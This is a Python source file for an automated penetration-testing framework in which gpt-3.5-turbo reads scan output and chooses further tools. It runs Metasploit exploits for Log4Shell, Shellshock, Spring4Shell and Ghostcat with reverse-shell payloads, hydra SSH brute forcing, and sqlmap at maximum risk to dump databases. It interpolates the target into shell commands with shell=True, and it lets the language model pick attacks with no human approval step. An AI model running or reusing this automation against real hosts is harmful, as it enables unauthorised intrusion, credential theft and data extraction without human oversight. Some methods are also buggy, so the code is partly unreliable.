import subprocess
import openai
import json
import ast
import re
import paramiko
import os
from dotenv import load_dotenv

load_dotenv()


api_key = os.getenv("OPEN_AI_API_KEY")
openai.api_key = api_key
def run_command(cmd):
        print("The command given:", cmd)
        result = {
            "status": None,
            "output": None,
            "error": None,
            "return_code": None,
        }
        try:
            # result = subprocess.run(cmd.split(), check=True, shell=True, capture_output=True, text=True)
            cmd_result = subprocess.run(cmd, check=False, capture_output=True, text=True, shell=True)
            result["status"] = 'success'
            result["output"] = cmd_result.stdout
            result["error"] =cmd_result.stderr
            result["return_code"] = cmd_result.returncode
        except Exception as e:
            print(f"Failed to run command {cmd}.\nException: {e}")
            result["status"] = 'failure'
            result["error"] = f"Failed to run command {cmd}.\nException: {e}"
            result["return_code"] = -1
        return result

class GenAi:
    def __init__(self):
        openai.api_key = os.getenv("OPEN_AI_API_KEY")
    def get(self,query,return_format,data):
        try:
            response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "You are a pentration tester, who uses pentration testing tools and based on their outputs answer the questions"+data},
                {"role": "user", "content": query+". Return this in "+ return_format+" format. Do notadd any additional data"}
            ]
        )
            answer=response["choices"][0]["message"]["content"]
            while(response["choices"][0]["finish_reason"]=='length'):
                
                    response = openai.ChatCompletion.create(
                    model="gpt-3.5-turbo",
                    messages=[
                        {"role": "system", "content": "You are a pentration tester, who uses pentration testing tools and based on their outputs answer the questions"+data},
                        {"role": "user", "content":query +" format: "+return_format },
                        {"role":"assistant","content":response["choices"][0]["message"]["content"][-100:]},
                        {"role":"user","content":"Finish the response from where you stopped for the previous query"}
                    ]
                )
                    answer+=response["choices"][0]["message"]["content"] 
        except Exception  as e:
                answer="[]"
                print(e)
        finally:
                return answer


class nmap:
    def __init__(self, ip):
        self.ip = ip
        self.port_service_version_list = []
        self.genai=GenAi()

    def extract_features(self, data):
        query="Return a list of dictionaries containing the following key value pairs: port open, service, and the version.If no ports are open return an empty list only without any text explaining or introduction . The output should either be '[]' or a populated list"
        return_format='[{"port":"number","service":"service_name","version":"service_version"}]'
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                self.port_service_version_list=soln
                return True
            else:
                return False

    def get_open_ports(self):
        # re_pattern_port = "([0-9]+)/tcp"
        # ports = re.findall(re_pattern_port, output)
        # self.open_ports = [int(port) for port in ports]
        # print("debug:", self.port_service_version_list)
        ret = [int(port_info['port']) for port_info in self.port_service_version_list]
        return ret

    def get_features(self):
        return self.features

    def run(self):
        cmd = f"nmap -sT -A {self.ip}"
        result = run_command(cmd)
        print(result)

        features_success = False
        if result['status'] == 'success':
            output = result["output"]
            features_success = self.extract_features(output)
            # print(features_success)
            if features_success is True:
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result

class gobuster:
    def __init__(self, ip, wordlist="/usr/share/wordlists/dirb/small.txt"):
        self.ip = ip
        self.wordlist = wordlist
        self.directories = []
        self.genai=GenAi()

    def extract_features(self,data):
        query="Return a list of directories"
        return_format="['directory_name1',directory_name2'...]"
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                for directory in soln:
                    if directory.startswith(f"http://{self.ip}"):
                        self.directories.append(directory)
                    elif directory.startswith("/"):
                        self.directories.append(f"http://{self.ip}{directory}")
                    else:
                        self.directories.append(f"http://{self.ip}/{directory}")
                return True
            else:
                return False
        
    def get_directory_list(self):
        return self.directories
        
    def run(self):
        cmd = f"gobuster dir -w {self.wordlist} -u http://{self.ip}/"
        result = run_command(cmd)
        print(result)
        output = result['output']

        # re_pattern_directory = f"http://{self.ip}*"
        # directories = re.findall(re_pattern_directory, output)
        # self.directories = re_pattern_directory
        # print("Directories:", directories)
        # return output

        features_success = False
        if result['status'] == 'success':
            output = result["output"]
            features_success = self.extract_features(output)
            
            if features_success is True:
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result


class ghostcat:
    def __init__(self, ip):
        self.ip = ip
        self.genai=GenAi()
        self.ghostcat_output=[]
    def extract_features(self,data):
        query="Return a dictionary containing any sensitive information else return an empty dictionary"
        return_format="{'data':'sensitive info'}"
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                self.ghostcat_output=soln
                print('GHOSTCAT FEATURES:\n' ,soln)
                return True
            else:
                return False
    def get_ghostcat_output(self):
        return self.ghostcat_output
    def run(self):
        cmd = f"msfconsole -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS {self.ip}; run; exit'"
        result = run_command(cmd)
        print(result)

        features_success = False
        if result['status'] == 'success':
            features_success = self.extract_features(result['output'])
            
            if features_success is True:
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result

class gospider:
    def __init__(self, ip):
        self.ip = ip
        self.urls=[]
        self.genai=GenAi()

    def extract_features(self,data):
        query="Return a list of urls"
        return_format="['url1,url2,'...]"
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                for url in soln:
                    if url.startswith(f"http://{self.ip}"):
                        self.urls.append(url)
                    elif url.startswith("/"):
                        self.urls.append(f"http://{self.ip}{url}")
                    else:
                        self.urls.append(f"http://{self.ip}/{url}")

                return True
            else:
                return False
        
    def get_urls(self):
        return self.urls
    
    def run(self):
        cmd = f"gospider -d 0 -s http://{self.ip}"
        result = run_command(cmd)
        print(result)

        features_success = False
        if result['status'] == 'success':
            features_success = self.extract_features(result['output'])
            
            if features_success is True:
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result

class log4shell:
    def __init__(self, ip):
        self.ip = ip

    def run(self):
        cmd = f"msfconsole -x 'use exploit/multi/http/log4shell_header_injection; set RHOSTS {self.ip}; set PAYLOAD java/shell_reverse_tcp; run;exit'"

        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        output = result['output']
        print(output)
        return output
    
class shellshock:
    def __init__(self, ip):
        self.ip = ip
        self.target_uri = "/cgi-bin/"
    
    def run(self):
        cmd = f"msfconsole -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {self.ip}; set TARGETURI /cgi-bin/; set PAYLOAD linux/x86/shell/reverse_tcp; run; exit'"
        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        output = result["output"]
        print(output)
        return output
class spring4shell:
    def __init__(self, ip):
        self.ip = ip

    def run(self):
        cmd = f"msfconsole -x 'use exploit/multi/http/spring_framework_rce_spring4shell; set RHOSTS {self.ip}; set PAYLOAD linux/x86/shell/reverse_tcp; run;exit'"
        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        output = result['output']
        print(output)
        return output



import ast

class sqlmap:
    def __init__(self, ip, url_list=[]):
        self.ip = ip
        self.url_list = url_list
        self.dbms='' #contains DBMS information
        self.database=[] #contains database information
        self.genai=GenAi()
        self.questions = [
            "List the DBMS software information",
            "List all databases",
            "List all tables that are not present by default",
            "List the table schema and the  data present in each table",
            "List all users and their privileges",
            "What would you rate the sensitivity of the data present (0 being the lowest and 10 being the highest)"
        ]
    
    # [{
    #     dbname: "",
    #     tables: [
    #         {
    #             table_name: "",
    #             row_list: [
    #                 ['col1_val', 'col2val'],
    #             ]
    #         },
    #     ]
    # }]

    def extract_features(self,data):
        query=["Return the DBMS software information","List of dictionaries containing database name which are not default or pre defined databases, tables in these database. If no database or table specified return an empty list '[]' not random values"]# and the content of each table"]
        return_format=['string containing the information','[{"dbname": name if any database present else "[]", "tables":[tablenames from output if present,...]}]']
        # return_format=['string containing the information','[user1,user2]','[{"dbname": name, "tables":{table_name:name,row_list:[[col1val,col2val....]]}]']
        soln1=self.genai.get(query[0],return_format[0],data)
        soln2=self.genai.get(query[1],return_format[1],data)
        soln2=ast.literal_eval(soln2)
        if len(soln1)>0 and len(soln2)>0:
            self.dbms=soln1
            self.database=soln2
            return True
        else:
            return False
        
    def get_sqlmap_output(self):
        if len(self.dbms) > 0 and len(self.database) > 0:
            return {
                "dbms": self.dbms,
                "database": self.database
            }
        else:
            return {}
    
    def run(self):
        result = {
            "status": "failure",
        }

        for url in self.url_list:
            # cmd = f"sqlmap -u http://{self.ip}/{directory}/"
            cmd = f"sqlmap --batch -v 0 -dbs -tables -u {url} --crawl=3 --level=2 --risk=3"
            result = run_command(cmd)
            print(result)

            features_success = False
            if result['status'] == 'success':
                output = result["output"]
                features_success = self.extract_features(output)
                
                if features_success is True:
                    result['status'] = 'success'
                    break
                else:
                    result['status'] = 'failure'
        return result
import ast
class ssh_bruteforce:
    def __init__(self, ip, username=None, password=None):
        self.ip = ip
        self.username = username
        self.password = password
        self.wordlist_username = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"  # Change this
        self.wordlist_password = "/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"  # Change this
        self.credentials={}
        self.genai=GenAi()
        
    def extract_features(self,data):
        query="Return dictionary of login and password"
        return_format="{'login':login,'password':password}"
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                self.credentials=soln
                return True
            else:
                return False
    def run(self):
        if self.username is None and self.password is None:
            cmd = f"hydra -f -q -L {self.wordlist_username} -P {self.wordlist_password} ssh://{self.ip}"
        elif self.username is not None:
            cmd = f"hydra -f -q -l {self.username} -P {self.wordlist_password} ssh://{self.ip}"
        elif self.password is not None:
            cmd = f"hydra -f -q -L {self.wordlist_username} -p {self.password} ssh://{self.ip}"
        else:
            return  # Change this
        
        result = run_command(cmd)
        print(result)
            # output = result['output']
            
            # # Extract info
            # print(output)

        features_success = False
        if result['status'] == 'success':
            output = result["output"]
            features_success = self.extract_features(output)
                
            if features_success is True:
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result


class ssh_login:
    def __init__(self, ip, username, password):
        self.ip = ip
        self.username = username
        self.password = password

    def run(self):
        cmd = f"whoami"
        print("The command given:", cmd)
        result = {
            "status": None,
            "output": None,
            "error": None,
            "return_code": None,
        }

        try:
            ssh = paramiko.SSHClient()
            ssh.connect(self.ip, username=self.username, password=self.password)
            stdin, stdout, stderr = ssh.exec_command(cmd)
            if len(stderr) > 0:
                result['status'] = 'failure'
                result['error'] = stderr
            elif len(stdout) > 0:
                result['status'] = 'success'
                result['output'] = stdout
        except Exception as err:
            result['status'] = 'failure'
            result['error'] = err
        
        print(result)
        return result

class wpscan:
    def __init__(self, ip):
        self.ip = ip
        self.misconfig=[]
        self.genai=GenAi()
        
    def extract_features(self,data):
        query="Return a list of any severe vulnerability if present without the wpscan API token else return an empty list '[]'"
        return_format="[vulnerability1,vulnerability2,...]"
        soln=self.genai.get(query,return_format,data)
        try:
            soln=ast.literal_eval(soln)
        except Exception as e:
            return_format=return_format+" your previous result for this query"+soln+" does not match the return format. Either return a populated list or an empty list only. "
            soln=self.genai.get(query,return_format,data)
            soln=ast.literal_eval(soln)
        finally:
            if len(soln)>0:
                self.misconfig=soln
                return True
            else:
                return False
    def run(self):
        cmd = f"wpscan --url http://{self.ip}"
        result = run_command(cmd)
        print(result)
        # Scrape output for knownn vulnerabilities
        # output = result['output']
        # print(output)

        print(result)

        features_success = False
        if result['status'] == 'success':
            output = result["output"]
            features_success = self.extract_features(output)
            
            if features_success is True:
                print('WPSCAN FEATURES:\n' ,self.wpscan.misconfig)
                result['status'] = 'success'
            else:
                result['status'] = 'failure'
        return result
import xml.etree.ElementTree as ET
class zap:
    def __init__(self, ip):
        self.ip = ip
        self.zap_output=[]

    def xml_to_dict(self, element):
        if len(element) == 0:
            return element.text
        result = {}
        for child in element:
            child_data = self.xml_to_dict(child)
            if child.tag in result:
                if type(result[child.tag]) is list:
                    result[child.tag].append(child_data)
                else:
                    result[child.tag] = [result[child.tag], child_data]
            else:
                result[child.tag] = child_data
        return result
    
    def get_zap_output(self):
        return self.zap_output
    
    def extract_features(self,data):
        xml_string=data
        start = xml_string.find("<alerts>")
        end = xml_string.rfind("</alerts>") + len("</alerts>")
        
        if start != -1 and end != -1:
            xml_content = xml_string[start:end]
            root = ET.fromstring(xml_content)
            result_dict = {root.tag: self.xml_to_dict(root)}
            st=[]
            for x in result_dict['alerts']['alertitem']:
                if int(x['riskcode'])>=2 and int(x['confidence'])>=2:
                    st.append({'name':x['name'],'desc':x['desc'],'urls':[y['uri'] for y in x['instances']['instance']]})
            if len(st)>0:
                self.zap_output=st
                print('ZAP FEATURES:\n' ,st)
                return True
            else:
                return False
        else:
            return False
        
    def run(self):
        cmd = f"zaproxy -cmd -silent -quickprogress -quickurl http://{self.ip}"
        result = run_command(cmd)
        print(result)

        if result['status'] == "success":
            output = result["output"]
            print(output)
        return result
import pdfkit

class Report:
    def __init__(self):
        self.file = open("./report/report.html", "w")
        self.opening_string = "<html>\n<head>\n<Link rel='stylesheet' href='report.css' />\n</head>\n<body>\n"
        self.closing_string = "</body>\n</html>"
        self.file.write(self.opening_string)


    def save(self):
        self.file.write(self.closing_string)
        self.file.close()
        pdfkit.from_file("./report/report.html", "./report/report.pdf", options={"enable-local-file-access": True})
    
    def write_tool_output(self, tool_name, tool_output, tool_feature_output=""):
        self.file.write(f"<h2>{tool_name}</h2>\n")
        replaced_tool_output = tool_output.replace("\n", "<br />\n")
        self.file.write(f"<p>{replaced_tool_output}</p>\n")
        self.file.write(f"<br />")
        self.file.write(f"<p>{tool_feature_output}</p>")
class framework:
    def __init__(self, ip, debug=False):
        self.ip = ip
        self.debug = debug
        self.gobuster_wordlist = "/usr/share/wordlists/dirb/small.txt"
        self.tools_output = dict()
        self.ports_open = []
        self.directory_list = []
        self.ssh_creds = {
            "username": "",
            "password": "",
        }


        self.report = Report()
        self.nmap = nmap(self.ip)
        self.gobuster = gobuster(self.ip, self.gobuster_wordlist)
        self.sqlmap = sqlmap(self.ip, self.directory_list)
        self.ssh_bruteforce = ssh_bruteforce(self.ip)
        self.ssh_login = ssh_login(self.ip, self.ssh_creds["username"], self.ssh_creds["password"])
        self.wpscan = wpscan(self.ip)
        self.ghostcat = ghostcat(self.ip)
        self.shellshock = shellshock(self.ip)
        self.spring4shell = spring4shell(self.ip)
        self.log4shell = log4shell(self.ip)
        self.gospider = gospider(self.ip)
        self.zap = zap(self.ip)

    def run_nmap(self):
        if self.debug:
            print("Running nmap")
        
        nmap_output = self.nmap.run()

        if nmap_output['status'] == 'success':
            print("Nmap output", nmap_output['output'])
            self.tools_output["nmap"] = nmap_output['output']
            self.ports_open = self.nmap.get_open_ports()
            print("Open ports:", self.ports_open)
            self.report.write_tool_output("nmap", nmap_output['output'], self.nmap.port_service_version_list)
            return 1
        else:
            return -1
    
    def run_gobuster(self):
        if 80 in self.ports_open:
            gobuster_output = self.gobuster.run()
            if gobuster_output['status'] == 'success':
                self.tools_output["gobuster"] = gobuster_output['output']
                gobuster_directory_list = self.gobuster.get_directory_list()
                print("Gobuster features", gobuster_directory_list)
                self.directory_list.extend(gobuster_directory_list)
                self.report.write_tool_output('gobuster', gobuster_output['output'], self.gobuster.directories)
                
                return 1
            else:
                return 0

        else:
            return -1
    
    def run_gospider(self):
        if 80 in self.ports_open:
            gospider_output = self.gospider.run()
            if gospider_output['status'] == 'success':
                self.tools_output["gospider"] = gospider_output['output']
                gospider_urls = self.gospider.get_urls()
                print("Gospider features", gospider_urls)
                self.directory_list.extend(gospider_urls)
                self.report.write_tool_output('gospider', gospider_output['output'], self.gospider.urls)
                return 1
            else:
                return 0

        else:
            return -1
            
    def run_sqlmap(self):
        if 80 in self.ports_open and len(self.directory_list) > 0:
            sqlmap_output = self.sqlmap.run()
            if sqlmap_output['status'] == 'success':
                self.tools_output["sqlmap"] = sqlmap_output['output']
                sqlmap_feature_output = self.sqlmap.get_sqlmap_output()
                print("Sqlmap features:", sqlmap_feature_output)
                self.report.write_tool_output('sqlmap', sqlmap_output['output'], sqlmap_feature_output)
                if len(sqlmap_feature_output) > 0:
                    return 1
                else:
                    return 0
            else:
                return 0
        else:
            return -1
    
    def run_ssh_bruteforce(self):
        if 22 in self.ports_open:
            ssh_bruteforce_output = self.ssh_bruteforce.run()
            if ssh_bruteforce_output['status'] == 'success':
                self.tools_output["ssh_bruteforce"] = ssh_bruteforce_output['output']
                self.report.write_tool_output('ssh bruteforce', ssh_bruteforce_output['output'])
                return 1
            else:
                return 0
        else:
            return -1

    def run_ssh_login(self):
        if 22 in self.ports_open:
            ssh_login_output = self.ssh_login.run()
            if ssh_login_output['status'] == 'success':
                self.tools_output["ssh_login"] = ssh_login_output['output']
                self.report.write_tool_output('ssh_login', ssh_login_output['output'])
                return 1
            else:
                return 0
        else:
            return -1

    def run_wpscan(self):
        if 80 in self.ports_open:
            wpscan_output = self.wpscan.run()
            if wpscan_output['status'] == 'success':
                self.tools_output["wpscan"] = wpscan_output['output']
                self.report.write_tool_output('wpscan', wpscan_output['output'])
                
                return 1
            else:
                return 0
        else:
            return -1

    def run_ghostcat(self):
        if 80 in self.ports_open:
            ghostcat_output = self.ghostcat.run()
            if ghostcat_output['status'] == 'success':
                self.tools_output["ghostcat"] = ghostcat_output['output']
                self.report.write_tool_output('ghostcat', ghostcat_output['output'])
                return 1
            else:
                return 0
        else:
            return -1

    def run_shellshock(self):
        if 80 in self.ports_open:
            shellshock_output = self.shellshock.run()
            if shellshock_output['status'] == 'success':
                self.tools_output["shellshock"] = shellshock_output['output']
                self.report.write_tool_output('shellshock', shellshock_output['output'])
                return 1
            else:
                return 0
        else:
            return -1
    
    def run_spring4shell(self):
        if 80 in self.ports_open:
            spring4shell_output = self.spring4shell.run()
            if spring4shell_output['status'] == 'success':
                self.tools_output["spring4shell"] = spring4shell_output['output']
                self.report.write_tool_output('spring4shell', spring4shell_output['output'])
                return 1
            else:
                return 0
        else:
            return -1

    def run_log4shell(self):
        if 80 in self.ports_open:
            log4shell_output = self.log4shell.run()
            if log4shell_output['status'] == 'success':
                self.tools_output["log4shell"] = log4shell_output
                self.report.write_tool_output('log4shell', log4shell_output['output'])
                return 1
            else:
                return 0
        else:
            return -1
        
    def run_zap(self):
        if 80 in self.ports_open:
            zap_output = self.zap.run()
            if zap_output['status'] == 'success':
                self.tools_output["zap"] = zap_output['output']
                zap_features_output = self.zap.get_zap_output()
                self.report.write_tool_output('zap', zap_output['output'], zap_features_output)
                if zap_features_output is not None and len(zap_features_output) > 0:
                    return 1
                else:
                    return 0
            else:
                return 0
        else:
            return -1
    
    def finish(self):
        self.report.save()

        
class Pentest:
    def __init__(self,ip,tools):
        self.frame=framework(ip)
        self.ip=ip
        self.tools=tools
        self.stack=['nmap']
        self.buffer=set()
        self.thresh=7
        self.used=[]
    def popstack(self):
        tool_name=self.stack.pop(0)
        return tool_name
    
    def caller(self,tool_name):
        func_name="run_"+tool_name
        func=getattr(self.frame,func_name)
        out=func()
        print("The out from caller is:",out)
        if out==1:
            output=self.frame.tools_output[tool_name]
            self.used.append(tool_name)
            print("The out from caller is:",output)
        else:
            output=''
        return output
    def fine_tune(self, json_content):
        self.thresh -= 1
        openai.api_key = self.api_key 
        response = openai.FineTune.create(
            data=json_content,
            model="gpt-3.5-turbo"  
        )
        lis=response.choices[0].message.content
        print("hello")
        print(lis)
        print("end")
        return ast.literal_eval(lis)
    def call_api(self,output):
        self.thresh-=1
        response = openai.ChatCompletion.create(
        model="gpt-3.5-turbo",
        messages=[
            {"role": "system", "content": f"You are a pentration tester, who uses pentration testing tools and based on their outputs decides which tool to use. Given the output of a particular tool determine which tool should be used from the list of tools only and donot include the complete list-{self.tools}"},
            {"role": "user", "content": f"Output: {output} return a list of tools which should be used from the list of tools given, return format: [tool1,tools2, ..] only relevant to the output, do not suggest {self.buffer} as these have already been used . Please do not add any additional data as an intoduction like based on output and content  and just provide the list."}
        ]
    )
        lis=response.choices[0].message.content
        print("hello")
        print(lis)
        print("end")
        try:
            o=ast.literal_eval(lis)
        except Exception as e:
            o=[]
        finally:
            return o
    def run_test(self):
        while(len(self.stack)>0):
            if self.thresh==0:
                break
            else:
                tool_name=self.popstack()
                if tool_name not in self.buffer:
                    self.buffer.add(tool_name)
                    out=self.caller(tool_name)
                    #print("Called caller")
                    #print("Output is:",out)
                    #print("output length: ",len(out))
                    if len(out)>0:
                        res=self.call_api(out)
                        print("Called api")
                        self.stack=res+self.stack
                        print('Current Stack of Tools: ',self.stack)
    def show_report(self):
        self.frame.finish()
    def tools_return(self):
        return self.used

# tools=['nmap','gobuster','sqlmap','wpscan','gospider','zap','ghostcat','ssh_login']
# ipaddr="10.10.230.22"
# ob=Pentest(ipaddr,tools)
# ob.run_test()